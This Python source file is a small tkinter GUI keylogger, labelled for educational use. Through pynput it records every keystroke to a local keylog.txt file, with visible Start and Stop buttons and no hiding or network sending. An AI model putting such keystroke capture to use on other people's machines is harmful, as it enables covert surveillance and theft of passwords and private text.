import tkinter as tk
from pynput import keyboard

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Simple Keylogger (Educational Use)")
        self.root.geometry("400x200")
        self.root.config(bg="#1e1e2e")

        self.label = tk.Label(root, text="Keylogger is OFF", font=("Arial", 14), fg="white", bg="#1e1e2e")
        self.label.pack(pady=20)

        self.start_button = tk.Button(root, text="Start Logging", command=self.start_logging, bg="#4CAF50", fg="white")
        self.start_button.pack(pady=5)

        self.stop_button = tk.Button(root, text="Stop Logging", command=self.stop_logging, bg="#f44336", fg="white")
        self.stop_button.pack(pady=5)

        self.listener = None

    def on_press(self, key):
        try:
            with open("keylog.txt", "a") as f:
                f.write(f"{key.char}")
        except AttributeError:
            with open("keylog.txt", "a") as f:
                f.write(f"[{key}]")

    def start_logging(self):
        if not self.listener:
            self.label.config(text="Keylogger is ON", fg="yellow")
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
            self.listener = None
            self.label.config(text="Keylogger is OFF", fg="white")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()